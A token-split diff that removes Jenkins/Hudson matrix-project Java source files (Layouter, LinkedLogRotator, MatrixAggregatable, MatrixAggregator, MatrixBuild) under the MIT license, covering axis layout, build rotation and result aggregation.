"nonTrivialAxes", ".", "add", "(", "a", ")", ";", "else", "trivial", ".", "add", "(", "a", ")", ";", "}", "switch", "(", "nonTrivialAxes", ".", "size", "(", "))", "{", "case", "0", ":", "break", ";", "case", "1", ":", "z", ".", "add", "(", "nonTrivialAxes", ".", "get", "(", "0", ")", ");", "break", ";", "case", "2", ":", "/", "/", "use", "the", "longer", "axis", "in", "Y", "Axis", "a", "=", "nonTrivialAxes", ".", "get", "(", "0", ")", ";", "Axis", "b", "=", "nonTrivialAxes", ".", "get", "(", "1", ")", ";", "x", ".", "add", "(", "a", ".", "size", "(", ")", ">", "b", ".", "size", "(", ")", "?", "b", ":", "a", ")", ";", "y", ".", "add", "(", "a", ".", "size", "(", ")", ">", "b", ".", "size", "(", ")", "?", "a", ":", "b", ")", ";", "break", ";", "default", ":", "/", "/", "for", "size", ">", "3", ",", "use", "x", "and", "y", ",", "and", "try", "to", "pack", "y", "more", "for", "(", "int", "i", "=", "0", ";", "i", "<", "nonTrivialAxes", ".", "size", "(", ");", "i", "+", "+", ")", "(", "i", "%", "3", "=", "=", "1", "?", "x", ":", "y", ")", ".", "add", "(", "nonTrivialAxes", ".", "get", "(", "i", ")", ");", "}", "init", "(", ");", "}", "private", "void", "init", "(", ")", "{", "xSize", "=", "calc", "(", "x", ",", "-", "1", ")", ";", "ySize", "=", "calc", "(", "y", ",", "-", "1", ")", ";", "zSize", "=", "calc", "(", "z", ",", "-", "1", ")", ";", "}", "/", "**", "*", "Computes", "the", "width", "of", "n", "-", "th", "X", "-", "axis", ".", "*", "/", "public", "int", "width", "(", "int", "n", ")", "{", "return", "calc", "(", "x", ",", "n", ")", ";", "}", "/", "**", "*", "Computes", "the", "repeat", "count", "of", "n", "-", "th", "X", "-", "axis", ".", "*", "/", "public", "int", "repeatX", "(", "int", "n", ")", "{", "int", "w", "=", "1", ";", "for", "(", "n", "-", "-;", "n", ">", "=", "0", ";", "n", "-", "-", ")", "w", "*", "=", "x", ".", "get", "(", "n", ")", ".", "size", "(", ");", "return", "w", ";", "}", "/", "**", "*", "Computes", "the", "width", "of", "n", "-", "th", "Y", "-", "axis", ".", "*", "/", "public", "int", "height", "(", "int", "n", ")", "{", "return", "calc", "(", "y", ",", "n", ")", ";", "}", "private", "int", "calc", "(", "List", "<", "Axis", ">", "l", ",", "int", "n", ")", "{", "int", "w", "=", "1", ";", "for", "(", "n", "+", "+", ";", "n", "<", "l", ".", "size", "(", ");", "n", "+", "+", ")", "w", "*", "=", "l", ".", "get", "(", "n", ")", ".", "size", "(", ");", "return", "w", ";", "}", "/", "**", "*", "Gets", "list", "of", "{", "@", "link", "Row", "}", "s", "to", "be", "displayed", ".", "*", "*", "The", "{", "@", "link", "Row", "}", "object", "is", "reused", ",", "so", "every", "value", "*", "in", "collection", "returns", "the", "same", "object", "(", "but", "with", "different", "values", ".", ")", "*", "/", "public", "List", "<", "Row", ">", "getRows", "(", ")", "{", "return", "new", "AbstractList", "<", "Row", ">", "()", "{", "final", "Row", "row", "=", "new", "Row", "(", ");", "public", "Row", "get", "(", "int", "index", ")", "{", "row", ".", "index", "=", "index", ";", "return", "row", ";", "}", "public", "int", "size", "(", ")", "{", "return", "ySize", ";", "}", "}", ";", "}", "/", "**", "*", "Represents", "a", "row", ",", "which", "is", "a", "collection", "of", "{", "@", "link", "Column", "}", "s", ".", "*", "/", "public", "final", "class", "Row", "extends", "AbstractList", "<", "Column", ">", "{", "private", "int", "index", ";", "final", "Column", "col", "=", "new", "Column", "(", ");", "@", "Override", "public", "Column", "get", "(", "int", "index", ")", "{", "col", ".", "xp", "=", "index", ";", "col", ".", "yp", "=", "Row", ".", "this", ".", "index", ";", "return", "col", ";", "}", "@", "Override", "public", "int", "size", "(", ")", "{", "return", "xSize", ";", "}", "public", "String", "drawYHeader", "(", "int", "n", ")", "{", "int", "base", "=", "calc", "(", "y", ",", "n", ")", ";", "if", "(", "index", "/", "base", "=", "=(", "index", "-", "1", ")", "/", "base", "&", "&", "index", "!", "=", "0", ")", "return", "null", ";", "/", "/", "no", "need", "to", "draw", "a", "new", "value", "Axis", "axis", "=", "y", ".", "get", "(", "n", ")", ";", "return", "axis", ".", "value", "(", "(", "index", "/", "base", ")", "%", "axis", ".", "getValues", "(", ").", "size", "(", "))", ";", "}", "}", "protected", "abstract", "T", "getT", "(", "Combination", "c", ")", ";", "public", "final", "class", "Column", "extends", "AbstractList", "<", "T", ">", "{", "/", "**", "*", "Cell", "position", ".", "*", "/", "private", "int", "xp", ",", "yp", ";", "private", "final", "Map", "<", "String", ",", "String", ">", "m", "=", "new", "HashMap", "<", "String", ",", "String", ">", "()", ";", "public", "T", "get", "(", "int", "zp", ")", "{", "m", ".", "clear", "(", ");", "buildMap", "(", "xp", ",", "x", ")", ";", "buildMap", "(", "yp", ",", "y", ")", ";", "buildMap", "(", "zp", ",", "z", ")", ";", "for", "(", "Axis", "a", ":", "trivial", ")", "{", "if", "(", "a", ".", "size", "(", ")", ">", "0", ")", "{", "m", ".", "put", "(", "a", ".", "name", ",", "a", ".", "value", "(", "0", ")", ");", "}", "}", "return", "getT", "(", "new", "Combination", "(", "m", ")", ");", "}", "private", "void", "buildMap", "(", "int", "p", ",", "List", "<", "Axis", ">", "axes", ")", "{", "int", "n", "=", "p", ";", "for", "(", "int", "i", "=", "axes", ".", "size", "(", ")-", "1", ";", "i", ">", "=", "0", ";", "i", "-", "-", ")", "{", "Axis", "a", "=", "axes", ".", "get", "(", "i", ")", ";", "m", ".", "put", "(", "a", ".", "name", ",", "a", ".", "value", "(", "n", "%", "a", ".", "size", "(", "))", ");", "n", "/", "=", "a", ".", "size", "(", ");", "}", "}", "public", "int", "size", "(", ")", "{", "return", "zSize", ";", "}", "}", "}", "@", "@", "-", "1", ",", "77", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "model", ".", "Job", ";", "import", "hudson", ".", "tasks", ".", "LogRotator", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "util", ".", "logging", ".", "Logger", ";", "/", "**", "*", "{", "@", "link", "LogRotator", "}", "for", "{", "@", "link", "MatrixConfiguration", "}", ",", "*", "which", "discards", "the", "builds", "if", "and", "only", "if", "it", "'", "s", "discarded", "*", "in", "the", "parent", ".", "*", "*", "<", "p", ">", "*", "Because", "of", "the", "serialization", "compatibility", ",", "we", "can", "'", "t", "easily", "*", "refactor", "{", "@", "link", "LogRotator", "}", "into", "a", "contract", "and", "an", "implementation", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "final", "class", "LinkedLogRotator", "extends", "LogRotator", "{", "LinkedLogRotator", "(", "int", "artifactDaysToKeep", ",", "int", "artifactNumToKeep", ")", "{", "super", "(", "-", "1", ",", "-", "1", ",", "artifactDaysToKeep", ",", "artifactNumToKeep", ")", ";", "}", "/", "**", "*", "@", "deprecated", "since", "1", ".", "369", "*", "Use", "{", "@", "link", "#", "LinkedLogRotator", "(", "int", ",", "int", ")", "}", "*", "/", "LinkedLogRotator", "(", ")", "{", "super", "(", "-", "1", ",", "-", "1", ",", "-", "1", ",", "-", "1", ")", ";", "}", "@", "Override", "public", "void", "perform", "(", "Job", "_job", ")", "throws", "IOException", ",", "InterruptedException", "{", "/", "/", "Let", "superclass", "handle", "clearing", "artifacts", ",", "if", "configured", ":", "super", ".", "perform", "(", "_job", ")", ";", "MatrixConfiguration", "job", "=", "(", "MatrixConfiguration", ")", "_job", ";", "/", "/", "copy", "it", "to", "the", "array", "because", "we", "'", "ll", "be", "deleting", "builds", "as", "we", "go", ".", "for", "(", "MatrixRun", "r", ":", "job", ".", "getBuilds", "(", ").", "toArray", "(", "new", "MatrixRun", "[", "0", "]", ")", ")", "{", "if", "(", "job", ".", "getParent", "(", ").", "getBuildByNumber", "(", "r", ".", "getNumber", "(", "))", "==", "null", ")", "{", "LOGGER", ".", "fine", "(", "\"", "Deleting", "\"", "+", "r", ".", "getFullDisplayName", "(", "))", ";", "r", ".", "delete", "(", ");", "}", "}", "if", "(", "!", "job", ".", "isActiveConfiguration", "(", ")", "&", "&", "job", ".", "getLastBuild", "(", ")=", "=", "null", ")", "{", "LOGGER", ".", "fine", "(", "\"", "Deleting", "\"", "+", "job", ".", "getFullDisplayName", "(", ")+", "\"", "because", "the", "configuration", "is", "inactive", "and", "there", "'", "s", "no", "builds", "\"", ");", "job", ".", "delete", "(", ");", "}", "}", "private", "static", "final", "Logger", "LOGGER", "=", "Logger", ".", "getLogger", "(", "LinkedLogRotator", ".", "class", ".", "getName", "(", "))", ";", "}", "@", "@", "-", "1", ",", "69", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "model", ".", "JobProperty", ";", "import", "hudson", ".", "tasks", ".", "BuildWrapper", ";", "import", "hudson", ".", "tasks", ".", "Publisher", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "/", "**", "*", "{", "@", "link", "Publisher", "}", ",", "{", "@", "link", "JobProperty", "}", ",", "{", "@", "link", "BuildWrapper", "}", "can", "optionally", "implement", "this", "interface", "*", "to", "perform", "result", "aggregation", "across", "{", "@", "link", "MatrixRun", "}", ".", "*", "*", "<", "p", ">", "*", "This", "is", "useful", "for", "example", "to", "aggregate", "all", "the", "test", "results", "*", "in", "{", "@", "link", "MatrixRun", "}", "into", "a", "single", "table", "/", "graph", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "115", "*", "/", "public", "interface", "MatrixAggregatable", "extends", "ExtensionPoint", "{", "/", "**", "*", "Creates", "a", "new", "instance", "of", "the", "aggregator", ".", "*", "*", "<", "p", ">", "*", "This", "method", "is", "called", "during", "the", "build", "of", "*", "{", "@", "link", "MatrixBuild", "}", "and", "the", "created", "aggregator", "*", "will", "perform", "the", "aggregation", ".", "*", "*", "@", "param", "build", "*", "The", "build", "for", "which", "the", "aggregation", "shall", "happen", ".", "Never", "null", ".", "*", "@", "param", "launcher", "*", "Can", "be", "used", "to", "launch", "processes", "during", "the", "build", ".", "*", "@", "param", "listener", "*", "Progress", "report", "and", "errors", "during", "the", "aggregation", "should", "*", "be", "sent", "to", "this", "object", ".", "Never", "null", ".", "*", "*", "@", "return", "*", "null", "if", "the", "implementation", "is", "not", "willing", "to", "contribute", "*", "an", "aggregator", ".", "*", "*", "@", "see", "MatrixAggregator", "#", "build", "*", "@", "see", "MatrixAggregator", "#", "listener", "*", "/", "MatrixAggregator", "createAggregator", "(", "MatrixBuild", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", ";", "}", "@", "@", "-", "1", ",", "105", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "ExtensionPoint", ";", "import", "hudson", ".", "Launcher", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "tasks", ".", "BuildStep", ";", "import", "hudson", ".", "tasks", ".", "Publisher", ";", "import", "java", ".", "io", ".", "IOException", ";", "/", "**", "*", "Performs", "the", "aggregation", "of", "{", "@", "link", "MatrixRun", "}", "results", "*", "into", "{", "@", "link", "MatrixBuild", "}", ".", "*", "*", "<", "p", ">", "*", "{", "@", "link", "MatrixAggregator", "}", "is", "a", "transitive", "stateful", "mutable", "object", ".", "*", "Unlike", "{", "@", "link", "Publisher", "}", ",", "it", "is", "not", "persisted", ".", "Instead", ",", "a", "fresh", "*", "instance", "is", "created", "for", "each", "{", "@", "link", "MatrixBuild", "}", ",", "and", "various", "*", "methods", "on", "this", "class", "are", "invoked", "in", "the", "event", "callback", "style", "*", "as", "the", "build", "progresses", ".", "*", "*", "<", "p", ">", "*", "The", "end", "result", "of", "the", "aggregation", "should", "be", "*", "{", "@", "link", "MatrixBuild", "#", "addAction", "(", "Action", ")", "contributed", "as", "actions", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "@", "since", "1", ".", "115", "*", "@", "see", "MatrixAggregatable", "*", "/", "public", "abstract", "class", "MatrixAggregator", "implements", "ExtensionPoint", "{", "/", "**", "*", "The", "build", "in", "progress", ".", "Never", "null", ".", "*", "/", "protected", "final", "MatrixBuild", "build", ";", "protected", "final", "Launcher", "launcher", ";", "/", "**", "*", "The", "listener", "to", "send", "the", "output", "to", ".", "Never", "null", ".", "*", "/", "protected", "final", "BuildListener", "listener", ";", "protected", "MatrixAggregator", "(", "MatrixBuild", "build", ",", "Launcher", "launcher", ",", "BuildListener", "listener", ")", "{", "this", ".", "build", "=", "build", ";", "this", ".", "launcher", "=", "launcher", ";", "this", ".", "listener", "=", "listener", ";", "}", "/", "**", "*", "Called", "before", "the", "build", "starts", ".", "*", "*", "@", "return", "*", "true", "if", "the", "build", "can", "continue", ",", "false", "if", "there", "was", "an", "error", "*", "and", "the", "build", "needs", "to", "be", "aborted", ".", "*", "@", "see", "BuildStep", "#", "prebuild", "(", "AbstractBuild", ",", "BuildListener", ")", "*", "/", "public", "boolean", "startBuild", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "return", "true", ";", "}", "/", "**", "*", "Called", "whenever", "one", "run", "is", "completed", ".", "*", "*", "@", "param", "run", "*", "The", "completed", "{", "@", "link", "MatrixRun", "}", "object", ".", "Always", "non", "-", "null", ".", "*", "@", "return", "*", "See", "{", "@", "link", "#", "startBuild", "(", ")}", "for", "the", "return", "value", "semantics", ".", "*", "/", "public", "boolean", "endRun", "(", "MatrixRun", "run", ")", "throws", "InterruptedException", ",", "IOException", "{", "return", "true", ";", "}", "/", "**", "*", "Called", "after", "all", "the", "{", "@", "link", "MatrixRun", "}", "s", "have", "been", "completed", "*", "to", "indicate", "that", "the", "build", "is", "about", "to", "finish", ".", "*", "*", "@", "return", "*", "See", "{", "@", "link", "#", "startBuild", "(", ")}", "for", "the", "return", "value", "semantics", ".", "*", "/", "public", "boolean", "endBuild", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "return", "true", ";", "}", "}", "@", "@", "-", "1", ",", "406", "+", "0", ",", "0", "@", "@", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2004", "-", "2011", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "*", "Red", "Hat", ",", "Inc", ".", ",", "Tom", "Huybrechts", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "hudson", ".", "AbortException", ";", "import", "hudson", ".", "Functions", ";", "import", "hudson", ".", "Util", ";", "import", "hudson", ".", "console", ".", "ModelHyperlinkNote", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ".", "ParentBuildAction", ";", "import", "hudson", ".", "model", ".", "AbstractBuild", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Executor", ";", "import", "hudson", ".", "model", ".", "Fingerprint", ";", "import", "hudson", ".", "model", ".", "Queue", ";", "import", "hudson", ".", "model", ".", "Queue", ".", "Item", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "util", ".", "HttpResponses", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "Stapler", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerResponse", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "export", ".", "Exported", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "interceptor", ".", "RequirePOST", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Calendar", ";", "import", "java", ".", "util", ".", "Collection", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Set", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "/", "**", "*", "Build", "of", "{", "@", "link", "MatrixProject", "}", ".", "*", "*", "@", "author", "Kohsuke", "Kawaguchi", "*", "/", "public", "class", "MatrixBuild", "extends", "AbstractBuild", "<", "MatrixProject", ",", "MatrixBuild", ">", "{", "private", "AxisList", "axes", ";", "/", "**", "*", "If", "non", "-", "null", ",", "the", "{", "@", "link", "MatrixBuild", "}", "originates", "from", "the", "given", "build", "number", ".", "*", "/", "private", "Integer", "baseBuild", ";", "public", "MatrixBuild", "(", "MatrixProject", "job", ")", "throws", "IOException", "{", "super", "(", "job", ")", ";", "}", "public", "MatrixBuild", "(", "MatrixProject", "job", ",", "Calendar", "timestamp", ")", "{", "super", "(", "job", ",", "timestamp", ")", ";", "}", "public", "MatrixBuild", "(", "MatrixProject", "project", ",", "File", "buildDir", ")", "throws", "IOException", "{", "super", "(", "project", ",", "buildDir", ")", ";", "}", "public", "Object", "readResolve", "(", ")", "{", "/", "/", "MatrixBuild", ".", "axes", "added", "in", "1", ".", "285", ";", "default", "to", "parent", "axes", "for", "old", "data", "if", "(", "axes", "=", "=", "null", ")", "axes", "=", "getParent", "(", ").", "getAxes", "(", ");", "return", "this", ";", "}", "/", "**", "*", "Deletes", "the", "build", "and", "all", "matrix", "configurations", "in", "this", "build", "when", "the", "button", "is", "pressed", ".", "*", "/", "@", "RequirePOST", "public", "void", "doDoDeleteAll", "(", "StaplerRequest", "req", ",", "StaplerResponse", "rsp", ")", "throws", "IOException", ",", "ServletException", "{", "checkPermission", "(", "DELETE", ")", ";", "/", "/", "We", "should", "not", "simply", "delete", "the", "build", "if", "it", "has", "been", "explicitly", "/", "/", "marked", "to", "be", "preserved", ",", "or", "if", "the", "build", "should", "not", "be", "deleted", "/", "/", "due", "to", "dependencies", "!", "String", "why", "=", "getWhyKeepLog", "(", ");", "if", "(", "why", "!", "=", "null", ")", "{", "sendError", "(", "hudson", ".", "model", ".", "Messages", ".", "Run_UnableToDelete", "(", "toString", "(", "),", "why", ")", ",", "req", ",", "rsp", ")", ";", "return", ";", "}", "List", "<", "MatrixRun", ">", "runs", "=", "getExactRuns", "(", ");", "for", "(", "MatrixRun", "run", ":", "runs", ")", "{", "why", "=", "run", ".", "getWhyKeepLog", "(", ");", "if", "(", "why", "!", "=", "null", ")", "{", "sendError", "(", "hudson", ".", "model", ".", "Messages", ".", "Run_UnableToDelete", "(", "toString", "(", "),", "why", ")", ",", "req", ",", "rsp", ")", ";", "return", ";", "}", "run", ".", "delete", "(", ");", "}", "delete", "(", ");", "rsp", ".", "sendRedirect2", "(", "req", ".", "getContextPath", "(", ")+", "'/", "'", "+", "getParent", "(", ").", "getUrl", "(", "))", ";", "}", "/", "**", "*", "Used", "by", "view", "to", "render", "a", "ball", "for", "{", "@", "link", "MatrixRun", "}", ".", "*", "/", "public", "final", "class", "RunPtr", "{", "public", "final", "Combination", "combination", ";", "private", "RunPtr", "(", "Combination", "c", ")", "{", "this", ".", "combination", "=", "c", ";", "}", "public", "MatrixRun", "getRun", "(", ")", "{", "return", "MatrixBuild", ".", "this", ".", "getRun", "(", "combination", ")", ";", "}", "/", "**", "*", "Return", "the", "URL", "to", "the", "run", "that", "this", "pointer", "references", ".", "*", "*", "In", "the", "typical", "case", ",", "this", "creates", "{", "@", "linkplain", "#", "getShortUrl", "(", ")", "a", "very", "short", "relative", "url", "}", ".", "*", "If", "the", "referenced", "run", "is", "a", "nearest", "previous", "build", ",", "this", "method", "returns", "a", "longer", "URL", "to", "that", "exact", "build", ".", "*", "{", "@", "link", "MatrixRun", "}", "which", "belongs", "to", "a", "given", "build", "{", "@", "link", "MatrixBuild", "}", ".", "*", "If", "there", "is", "no", "run", "which", "belongs", "to", "the", "build", ",", "return", "url", "of", "run", ",", "which", "belongs", "to", "the", "nearest", "previous", "build", ".", "*", "/", "public", "String", "getNearestRunUrl", "(", ")", "{", "MatrixRun", "r", "=", "getRun", "(", ");", "if", "(", "r", "=", "=", "null", ")", "return", "null", ";", "if", "(", "getNumber", "(", ")=", "=", "r", ".", "getNumber", "(", "))", "return", "getShortUrl", "(", ")+", "'/", "';", "else", "return", "Stapler", ".", "getCurrentRequest", "(", ").", "getContextPath", "(", ")+", "'/", "'+", "r", ".", "getUrl", "(", ");", "}", "public", "String", "getShortUrl", "(", ")", "{", "return", "Util", ".", "rawEncode", "(", "combination", ".", "toString", "(", "))", ";", "}", "public", "String", "getTooltip", "(", ")", "{", "MatrixRun", "r", "=", "getRun", "(", ");", "if", "(", "r", "!", "=", "null", ")", "return", "r", ".", "getIconColor", "(", ").", "getDescription", "(", ");", "Queue", ".", "Item", "item", "=", "Jenkins", ".", "getInstance", "(", ").", "getQueue", "(", ").", "getItem", "(", "getParent", "(", ").", "getItem", "(", "combination", ")", ");", "if", "(", "item", "!", "=", "null", ")", "return", "item", ".", "getWhy", "(", ");", "return", "null", ";", "/", "/", "fall", "back", "}", "}", "public", "Layouter", "<", "RunPtr", ">", "getLayouter", "(", ")", "{", "/", "/", "axes", "can", "be", "null", "if", "build", "page", "is", "access", "right", "when", "build", "starts", "return", "axes", "=", "=", "null", "?", "null", ":", "new", "Layouter", "<", "RunPtr", ">", "(", "axes", ")", "{", "protected", "RunPtr", "getT", "(", "Combination", "c", ")", "{", "return", "new", "RunPtr", "(", "c", ")", ";", "}", "}", ";", "}", "/", "**", "*", "Sets", "the", "base", "build", "from", "which", "this", "build", "is", "derived", ".", "*", "@", "since", "1", ".", "416", "*", "/", "public", "void", "setBaseBuild", "(", "MatrixBuild", "baseBuild", ")", "{", "this", ".", "baseBuild", "=", "(", "baseBuild", "=", "=", "null", "|", "|", "baseBuild", "=", "=", "getPreviousBuild", "(", "))", "?", "null", ":", "baseBuild", ".", "getNumber", "(", ");", 